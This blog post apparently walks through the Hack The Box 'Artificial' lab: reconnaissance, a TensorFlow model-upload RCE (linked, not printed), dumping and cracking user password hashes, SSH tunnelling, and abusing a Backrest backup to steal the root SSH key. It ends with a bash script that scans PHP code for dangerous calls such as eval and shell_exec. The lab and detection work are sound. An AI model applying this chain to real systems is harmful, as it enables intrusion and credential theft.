# Miscellaneous 8

## HTB "Artificial" retrospective

As always, we are starting with a simple Nmap scan to get lay off the land:

```
Nmap scan report for 10.10.11.74
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Poking at the web service first seems logical:

```
curl -v http://10.10.11.74
```

The output:

```
* Connected to 10.10.11.74 (10.10.11.74) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.10.11.74
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Thu, 23 Oct 2025 16:11:49 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://artificial.htb/
< 
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.10.11.74 left intact
```

After mapping ```artificial.htb``` to the target IP and loading the site I was greeted by a marketing-style landing page advertising an AI model-building service, with a small code preview embedded below the fold. Wappalyzer only reported an Nginx 1.18.0 front end and a reverse proxy — nothing that screams “framework” or gives away app internals. The site header exposes *Login* and *Register* links (obvious attack surface).

Let's hunt for some interesting directories next:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://artificial.htb/
```

The output:

```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artificial.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

Digging for some interesting files next:

```
feroxbuster -u http://artificial.htb/ -w /usr/share/wordlists/seclists/Fuzzing/extensions-Bo0oM.txt -E -B -s 200 --auto-tune
```

The output:

```
Target Url            │ http://artificial.htb/
Threads               │ 50
Wordlist              │ /usr/share/wordlists/seclists/Fuzzing/extensions-Bo0oM.txt
Status Codes          │ [200]
Timeout (secs)        │ 7
User-Agent            │ feroxbuster/2.11.0
Config File           │ /etc/feroxbuster/ferox-config.toml
Extract Links         │ true
Collect Extensions    │ true
Ignored Extensions    │ [Images, Movies, Audio, etc...]
Collect Backups       │ true
HTTP methods          │ [GET]
Auto Tune             │ true
Recursion Depth       │ 4
New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       28l       60w      857c http://artificial.htb/login
200      GET       33l       65w      952c http://artificial.htb/register
200      GET      313l      666w     6610c http://artificial.htb/static/css/styles.css
200      GET       33l       73w      999c http://artificial.htb/static/js/scripts.js
200      GET      161l      472w     5442c http://artificial.htb/
[####################] - 4s       119/119     0s      found:4       errors:0      
[################>---] - 1s        70/86      62/s    http://artificial.htb/
```

Since the generic fuzz didn’t turn up anything groundbreaking, we are inspecting the contents of ```scripts.js```:

```
curl -s -H "Host: artificial.htb" http://10.10.11.74/static/js/scripts.js -o scripts.js
```

And here are the contents of ```scripts.js```:

```
document.getElementById('model-upload-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const formData = new FormData();
    const fileInput = document.getElementById('model_file');
    formData.append('model_file', fileInput.files[0]);

    fetch('/upload_model', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.message) {
            alert('Model uploaded successfully!');
        } else {
            alert('Error: ' + data.error);
        }
    })
    .catch(error => {
        console.error('Error uploading model:', error);
    });
});

document.getElementById('review-form').addEventListener('submit', function(event) {
});

document.getElementById('upload-form').addEventListener('submit', function (event) {
    if (document.querySelector('input[type="file"]').files.length === 0) {
        alert("Please select a model file.");
        event.preventDefault();
    }
});
```

Turns out, that ```scripts.js``` might be a promising lead. It reveals a POST endpoint ```/upload_model``` that accepts ```multipart/form-data``` and a client-side check that only ensures a file is selected (no server-side validation visible), so the attack surface is file uploads and possible unsafe model handling on the backend.

Breakdown (what the code does):

1. ```document.getElementById('model-upload-form').addEventListener('submit', ...)``` — intercepts the upload form submit and calls ```event.preventDefault()``` to stop the normal page reload. The script builds a ```FormData()``` object and appends the first file chosen in the ```#model_file``` input, then sends it with ```fetch('/upload_model', { method: 'POST', body: formData })```.

2. ```.then(response => response.json())``` — code expects the server to return JSON and then either shows a success alert when ```data.message``` exists or an error alert with ```data.error```.

3. The ```review-form``` has an empty submit listener (looks incomplete) — a likely leftover or stub.

4. The ```upload-form``` listener performs *only* client-side validation: it checks that a file is chosen and prevents submit if none is selected. That’s purely UX-level protection.

**Perceived vulnerabilities & why they matter:**

1. *Unrestricted file upload* — the client only checks “a file exists” and the JS gives no hint of server-side validation. If the server accepts arbitrary filenames/types, attackers can upload dangerous files (malicious archives, scripts, or model formats that trigger code). This is a primary high-ROI attack surface.

2. *Unsafe deserialization risk* — the app advertises model uploads; many Python model workflows use ```pickle```/```.pkl``` or other binary serializers. If the server deserializes uploaded models without strict validation or in an unsafe environment, that can lead to remote code execution (RCE). This is a high-impact but implementation-specific risk.

3. *Filename/Content-Type manipulation & path traversal* — if the server trusts the uploaded filename or doesn’t sanitize it, attackers can try filenames like ```../../something``` or include special characters to influence storage paths or overwrite files. Even if traversal is blocked, predictable filenames/paths can expose sensitive data via IDOR.

4. *Information leakage in responses* — the client expects JSON; the server might leak file paths, model IDs, or processing logs in the JSON response. Those leaks make it easy to find uploaded content or follow up with targeted requests.

5. *Lack of auth/CSRF protections (possible)* — nothing in the JS indicates auth tokens or CSRF protection. If the upload endpoint accepts unauthenticated requests, it could be abused remotely or via CSRF if not protected.

6. *Stored XSS via filename or metadata* — if uploaded filenames or metadata are later rendered in admin pages without encoding, attackers can inject scripts.

7. *Processing-time side effects (SSRF, resource exhaustion)* — model processing often triggers network I/O or spawns processes. Uploaded files could cause the server to make outbound requests (SSRF) or spawn heavy computation, leading to DoS or data exfiltration if outputs are logged.

*Short TL;DR:* the JS reveals a direct ```POST /upload_model``` endpoint with only client-side checks. The highest-risk vector is unsafe handling of uploaded model files (deserialization), followed by unrestricted uploads, filename trust, and info leaks.

Anyway, after registering and authenticating to ```artificial.htb``` I was redirected to ```/dashboard```, which exposes an “Upload, manage, and run your AI models here” interface. My initial plan was to intercept upload requests in Burp/ZAP to investigate a bit, then perform further probing.

While exploring the dashboard I discovered that uploaded files are not simply stored but appear to be processed by the backend. A README on the site specifies ```tensorflow-cpu==2.13.1```, which is important because TensorFlow-based pipelines sometimes deserialize model artifacts or load custom layers — both of which have a history of unsafe handling. A quick search turned up a public RCE PoC targeting TensorFlow (malicious Lambda layer abuse), so this upload-processing pipeline is a high-priority attack surface: if the server loads model artifacts or untrusted serialized objects into a TensorFlow runtime, it may be possible to trigger remote code execution.

The exploit can be found [here.](https://github.com/Splinter0/tensorflow-rce)

Further research indicated the attack surface lives in the model-handling pipeline: the application accepts user-supplied ```.h5``` artifacts and (apparently) loads them server-side using the exact TensorFlow runtime specified in the project (```tensorflow-cpu==2.13.1```). In Keras, a model is simply a chain of *layers* — each layer is a function-like block that accepts input tensors and returns output tensors, and those blocks are composed to form the full computation graph. Most layers are high-level, well-defined operations (Dense, Conv, ReLU, etc.), but the Lambda layer is different: it lets developers wrap an arbitrary Python expression or function as a layer. Because that function reference can be serialized into the model file, loading a model that contains a Lambda can cause Python code to be re-instantiated and executed during ```load_model()``` — which is why loading untrusted ```.h5``` files is intrinsically dangerous.

Given that the Artificial website included a Dockerfile with the same TensorFlow build used by the service, I replicated the environment in an isolated container so I could compile the exploit. Here are the commands I used:

```
docker build -f Dockerfile-tensorflow -t tensor-flow-2.13.1-for-htb-machine .

docker run --rm -it -v "$PWD":/code -w /code tensor-flow-2.13.1-for-htb-machine
```

Breakdown of the first command:

- ```docker build``` — tell Docker to create an image (a reusable filesystem + runtime).

- ```-f Dockerfile-tensorflow``` — use the file named ```Dockerfile-tensorflow``` instead of the default ```Dockerfile```.

- ```-t tensor-flow-2.13.1-for-htb-machine``` — tag the resulting image with a human-friendly name so you can refer to it later.

- ```.``` — the build *context* (the directory whose files are available to the Docker build); Docker reads the Dockerfile and any files in this folder during the build. Result: you get a local image named ```tensor-flow-2.13.1-for-htb-machine``` that contains the runtime described by the Dockerfile.

Breakdown of the second command:

- ```docker run``` — start a new container (an instance of the image).

- ```--rm``` — automatically remove the container when it exits (keeps your host tidy; ephemeral container).

- ```-it``` — ```-i``` keeps STDIN open and ```-t``` allocates a pseudo-TTY, making the container interactive (so you get a shell).

- ```-v "$PWD":/code``` — bind-mount your current host directory (```$PWD```) into the container at ```/code```; files you create in ```/code``` inside the container appear on your host in the current folder and vice versa.

- ```-w /code``` — set the container’s working directory to ```/code``` on start (you drop straight into that folder).

- ```tensor-flow-2.13.1-for-htb-machine``` — the image to instantiate.

*Notes/tips:* use an absolute host path (```-v /home/user/...:/code```) if you prefer, add ```-u $(id -u):$(id -g)``` to prevent files being owned by ```root```, and add ```--network none --cap-drop ALL --security-opt no-new-privileges``` if you want an air-gapped, locked-down container for safer experimentation.

After a bit of digging, I stumbled upon a Python script referencing a database named ```usersd.db```, which immediately caught my attention as a potential lead. Once I transferred the file to my local environment, it was time to take a closer look at what secrets might be hidden inside.

```
app@artificial:~/app/instance$ ls -la
ls -la
total 32
drwxr-xr-x 2 app app  4096 Oct 29 17:10 .
drwxrwxr-x 7 app app  4096 Jun  9 13:56 ..
-rw-r--r-- 1 app app 24576 Oct 29 17:10 users.db
```

Next steps:

```
# Open the database with sqlite3
sqlite3 users.db

# Once inside sqlite3, run these commands:
.tables                    # Show all tables
.schema                    # Show table structure
SELECT * FROM user;        # Get all users
SELECT * FROM model;       # Get all models (if any)

# Or do it in one command from bash:
sqlite3 users.db "SELECT * FROM user;"
```

After inspecting the database dump I found several username entries paired with hashed passwords. Cross-referencing system activity revealed that the user ```gael``` had an active shell on the host. 

```
sqlite> .tables
model  user 
sqlite> SELECT * FROM user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|test|test@test.com|5f4dcc3b5aa765d61d8327deb882cf99
7|test1234|test@test1234.com|16d7a4fca7442dda3ad93c9a726597e4
```

So, I moved the hash for cracking and recovered the corresponding credential:

```
mattp005numbertwo
```

During network service enumeration, socket statistics revealed a non-standard service listening on TCP port 9898. To investigate this mysterious endpoint, I established an SSH tunnel and accessed it through my local browser.

```
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb -N -f
http://localhost:9898/
```

The tunneled service presented a Backrest authentication portal. With no immediate credentials available, I pivoted to filesystem enumeration, where I discovered a promising artifact: ```backrest_backup.tar.gz``` in ```/var/backups/```. Initial extraction attempts on the target failed, so I transferred the archive to my attack machine via SCP for deeper analysis.

```
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz backrest_backup.tar.gz
tar -xvzf backrest_backup.tar.gz
```

Exploring the extracted backup contents, I discovered a ```.config``` directory containing some application configuration files. A targeted search for authentication data revealed credentials for a ```backrest_root``` user alongside what appeared to be a password hash.

```
cd .config 
grep -r -i "passw" * 2>/dev/null
```

Initial hash identification proved challenging, but closer inspection suggested potential Base64 encoding. After decoding and re-analyzing with hashid, the true hash format was revealed, allowing successful cracking that yielded the Backrest administrative password.

```
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d > hash2.txt
```

And here is the cracked password:

```
!@#$%^
```

Successful Backrest login revealed a comprehensive backup management system. After establishing the required repository, I created a backup plan targeting the critical ```/root/.ssh``` directory. Through some trial end error with path manipulation during restoration, I redirected the backup to an accessible location (like ```/tmp```), enabling direct download of the archive via the web browser. The extracted SSH private key, after proper permission hardening (```chmod 400```), granted immediate root access through SSH, culminating in successful flag capture.

This example is now concluded.

## Bonus: PHP dangerous methods PoC

```
#!/usr/bin/env bash
# phphazard - scan PHP files for dangerous function calls and show context
# Usage: ./phphazard.sh [dir]    (defaults to current directory)
set -u

DIR="${1:-.}"
PAT='(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec)\s*\('

# run the search, quietly ignoring permission errors
grep -RIn --include='*.php' -P "\b$PAT" "$DIR" 2>/dev/null \
| while IFS=: read -r file line rest; do
  start=$(( line>2 ? line-2 : 1 ))
  echo -e "\e[1;36m== $file:$line ==\e[0m"
  sed -n "${start},$((line+2))p" "$file" 2>/dev/null \
    | GREP_COLOR='1;31' grep --color=always -E "\b$PAT" || true
  echo
done
```

Save as ```phphazard.sh``` (or your chosen name), then make executable:

```
chmod +x phphazard.sh
./phphazard.sh        # scans current dir
./phphazard.sh /path/to/project  # scan a specific folder
```

Breakdown:

1. ```set -u```

- ```set``` *builtin* with the ```-u``` option (a.k.a. ```nounset```). Causes the script to exit with an error if an *unset* variable is referenced.

- Purpose: catch typos or forgotten variables early. Example: ```$FOO``` will abort if ```FOO``` was never defined. It does not protect against empty strings (that’s ```-o nounset``` vs ```-o errexit``` differences); it simply treats undefined variables as fatal.

2. ```DIR="${1:-.}"```

- *Parameter expansion* with a default value.

- ```:-``` = if ```${1}``` is unset or null, substitute the right-hand value (```.```). So ```DIR``` gets either the argument or ```.``` (current dir).

- The double quotes ```"``` protect spaces in the expanded value. Assignment is plain ```=```.

3. ```PAT='(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec)\s*\('```

- *Single-quoted string* assigns a literal regex pattern to ```PAT```. Inside single quotes, nothing is interpolated (no backslash escapes are expanded by the shell).

**The regex:**

- ```( ... | ... )``` = alternation group (PCRE - Perl Compatible Regular Expressions).

- ```\s*``` = zero or more whitespace characters (space, tab). ```\s``` requires PCRE (grep -P).

- ```\(``` = literal opening parenthesis. We escape ```(``` because in many regex flavors ```(``` is special; here we want the literal ```(``` after the function name to match a call.

- ```PAT``` is later used inside a double-quoted string to allow variable expansion.

4. ```grep -RIn --include='*.php' -P "\b$PAT" "$DIR" 2>/dev/null \```

```grep``` command with several options:

- ```-R``` = recursive: descend into directories.

- ```-I``` = ignore binary files (treat them as if they don’t contain matches). Useful so binary blobs don’t slow or clutter results.

- ```-n``` = show line numbers in the output (```file:linenumber:matched_line```).

- ```--include='*.php'``` = only consider files whose names match ```*.php```. This avoids scanning every file type. The pattern is quoted to prevent shell globbing here.

- ```-P``` = use PCRE (Perl-compatible regex). Required for ```\b``` and ```\s``` semantics in many ```grep``` builds.

- ```"\b$PAT"``` = the regex to match. Double quotes allow ```$PAT``` expansion. ```\b``` = word boundary (so ```eval``` in ```myeval``` won’t match). Because ```-P``` is used, ```\b``` and ```\s``` behave as PCRE word boundaries/whitespace.

- ```"$DIR"``` = the directory to search; quoted to allow spaces.

- ```2>/dev/null``` = stderr redirection: file descriptor ```2``` (standard error) is redirected to ```/dev/null```, discarding permission errors and other warnings.

- Trailing backslash ```\``` = *line continuation:* tells the shell the command continues on the next physical line (purely for readability).

- *What ```grep``` prints:* lines like ```path/to/file.php:123: suspicious_function_call(...)```

5. ```| while IFS=: read -r file line rest; do```

- ```|``` = *pipe operator:* the stdout of the left command (grep) is fed to stdin of the right command (the ```while``` loop).

- ```while ...; do``` starts a loop that reads input line-by-line.

- ```IFS=:``` is an *assignment* that sets the ```IFS``` (Internal Field Separator) for the ```read``` command only (since it’s placed before ```read```). It tells ```read``` to split fields on ```:``` instead of default whitespace. Useful because ```grep -n``` uses colons to separate ```file:line:content```.

6. ```read -r file line rest``` reads the piped line into variables:

- ```-r``` disables interpretation of backslashes as escape characters (so backslashes are read raw). Good practice so paths containing ```\``` aren’t mangled.

- ```file``` gets the part before first ```:``` (filename).

- ```line``` gets the part between first and second ```:``` (line number).

- ```rest``` receives everything after the second ```:``` (the matched content). Because ```IFS``` is ```:```, fields are split accordingly. If the filename itself contained ```:```, this would be slightly brittle, but for typical Linux paths that’s rare.

- The loop body begins after ```do```.

7. ```start=$(( line>2 ? line-2 : 1 ))```

- *Arithmetic expansion* with ```$(( ... ))```. Inside this, arithmetic expressions are evaluated.

- ```line>2 ? line-2 : 1``` uses the *ternary operator* (C-style) inside arithmetic expansion:

- If ```line > 2```, then ```start = line - 2``` (two lines before the matched line).

- Else ```start = 1``` (don’t request a start line less than 1).

- This ensures we can safely request a context block that includes up to two lines before the match without going negative or zero. ```line``` is a string from ```read```, but in arithmetic context it’s coerced to integer.

- *Note:* A ternary operator is a programming construct that takes three operands and evaluates a condition to return one of two values based on whether the condition is true or false. It is often used as a shorthand for an ```if-else``` statement, with the syntax typically being ```condition ? valueIfTrue : valueIfFalse```.

8. ```echo -e "\e[1;36m== $file:$line ==\e[0m"```

- ```echo -e``` prints the string with backslash escape sequences interpreted (```-e``` enables interpretation of ```\e```/```\n``` etc; behavior can vary by shell but in bash ```-e``` works).

- ```\e[1;36m``` = ANSI escape code for *bold cyan* (1 = bold, 36 = cyan foreground). This colors the header.

- ```== $file:$line ==``` = printable header that shows which file and which line hit. ```$file``` and ```$line``` are expanded.

- ```\e[0m``` resets terminal attributes back to normal (ends coloring). If your terminal doesn’t support colors, you’ll just see the raw escape sequences or no color.

9. ```sed -n "${start},$((line+2))p" "$file" 2>/dev/null \```

- ```sed``` is used to *print a range of lines* around the match: ```"${start},$((line+2))p"``` defines the range.

- ```${start}``` = start line computed earlier (note the braces which are recommended for parameter expansion when adjacent to other chars).

- ```$((line+2))``` = arithmetic expansion adding 2 to the matched ```line``` number (two lines after match).

- The combined ```"${start},<end>p"``` instructs ```sed``` to *print* only that block (```-n``` suppresses default printing, so ```p``` explicitly prints matching lines).

- ```"$file"``` = the path to the file to operate on. Quoted for safety.

- ```2>/dev/null``` discards any ```sed``` errors (e.g., permission denied).

- Trailing backslash ```\``` continues the pipeline into the next line.

10. ```| GREP_COLOR='1;31' grep --color=always -E "\b$PAT" || true```

- ```|``` pipes the ```sed``` output (the snippet of lines) into ```grep```. This second ```grep``` is used to *highlight* the matched function calls *inside the snippet.*

- ```GREP_COLOR='1;31'``` is an *environment assignment* that sets a variable for the single command that follows. Historically ```GREP_COLOR``` tells ```grep``` how to color matched text; many modern greps use ```GREP_COLORS``` instead but ```GREP_COLOR``` often still works in common GNU grep builds. ```1;31``` = bold red text. This only applies to this invocation of ```grep```.

11. ```grep --color=always -E "\b$PAT"```

- ```--color=always``` forces colored output even when output is piped (useful so we keep the color escape codes in the terminal).

- ```-E``` invokes *extended regular expressions.* We previously used ```-P``` for PCRE because of ```\s```, ```\b```; here ```-E``` is acceptable if the ```\b``` pattern works—however, we placed the large ```PAT``` inside ```\b...``` and rely on PCRE in the first ```grep```. In practice, ```-E``` may treat ```\b``` as a backspace in some systems; but many setups let ```\b``` function or the shell’s ```grep``` accepts it. If you want absolute consistency, you can use ```-P``` here too.

- ```"\b$PAT"``` double-quoted expands ```$PAT```. The ```\b``` ensures word-boundary matching.

- ```|| true``` ensures the pipeline *succeeds* (returns exit status 0) even if ```grep``` finds nothing. That’s important because if ```grep``` exits non-zero, ```set -u``` won’t cause exit but some shells in other contexts might propagate failure; ```|| true``` just prevents the whole pipeline from halting on a non-zero exit code (useful in ```set -e``` scripts or if you don’t want the loop to break). Together this line shows context and colors the matched functions inside it.

12. ```echo```

- Prints a blank line to visually separate results for readability.

13. ```done```

- Closes the ```while``` loop. The loop iterates for each ```grep``` hit fed through the pipe.

**Extra notes & operators recap:**

*Redirections:* ```2>/dev/null``` redirects stderr (fd 2) to ```/dev/null``` (discard). You used this twice to suppress permission or other noise — good for noisy repositories.

- *Pipes* (```|```) chain stdout → stdin between programs. The output of ```grep``` feeds ```while``` via the pipe.

- *Environment assignment before command* (```GREP_COLOR='1;31' grep ...```) sets a temporary env var only for that command.

- ```read -r``` and ```IFS=```: setting ```IFS``` to ```:``` for the ```read``` is a neat trick so we parse ```file:line:content``` easily. ```-r``` prevents backslash escapes.

- *Arithmetic* ```$(( ... ))```: used for numerical ops and the ternary operator. Valid operators inside: ```+ - * / % > < ? :``` etc. Works on integers.

- *Parameter expansion with default* ```${1:-.}```: returns first argument or ```.``` if absent. Very common idiom for optional args.

- *Quoting:* we used quotes consistently for expansions (```"$DIR"```, ```"$file"```), which prevents word-splitting and globbing — excellent practice.

**Small portability & improvement suggestions:**

- Use ```grep -P``` for both greps to ensure ```\s``` and ```\b``` behave the same in both places:

```
| GREP_COLOR='1;31' grep --color=always -P "\b$PAT" || true
```

- ```GREP_COLOR``` is older; ```GREP_COLORS='mt=1;31'``` is the modern replacement (mt = match color). Example:

```
| GREP_COLORS='mt=1;31' grep --color=always -P "\b$PAT" || true
```

- If filenames could contain ```:``` (rare), the ```IFS=:``` parsing could break; alternative is to have ```grep --null``` and ```read -r -d '' file``` style processing — more robust but more verbose.

- If you want to avoid ```echo -e``` portability issues, use ```printf``` for color headers:

```
printf '\033[1;36m== %s:%s ==\033[0m\n' "$file" "$line"
```
